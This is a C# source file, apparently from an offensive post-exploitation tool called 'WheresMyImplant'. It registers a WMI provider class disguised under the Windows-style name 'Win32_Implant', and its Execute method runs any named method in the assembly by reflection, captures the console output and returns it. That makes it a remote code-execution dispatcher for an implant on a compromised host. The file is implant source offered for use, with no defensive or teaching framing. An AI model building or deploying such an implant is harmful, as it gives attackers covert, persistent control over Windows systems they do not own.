using System;
using System.IO;
using System.Management.Instrumentation;
using System.Reflection;
using System.Runtime.InteropServices;

namespace WheresMyImplant
{
    [ComVisible(true)]
    [ManagementEntity(Name = "Win32_Implant")]
    public sealed class Implant
    {
        [ManagementTask]
        public static String Execute(String namespaceName, String className, String methodName, String arguments)
        {
            TextWriter currentOut = Console.Out;

            System.Text.StringBuilder output = new System.Text.StringBuilder();
            using (var memoryStream = new MemoryStream())
            {
                using (StreamWriter streamWriter = new StreamWriter(memoryStream))
                {                  
                    Console.SetOut(streamWriter);
                    var assembly = Assembly.GetExecutingAssembly();
                    try
                    {
                        Type type = assembly.GetType(namespaceName + "." + className);
                        MethodInfo methodInfo = type.GetMethod(methodName);
                        Console.WriteLine((String)methodInfo.Invoke(null, arguments.Split(',')));
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                    
                    streamWriter.Flush();
                    output.Append(System.Text.Encoding.Default.GetString(memoryStream.ToArray()));
                }
            }
            Console.SetOut(currentOut);
            return output.ToString();
        }
    }
}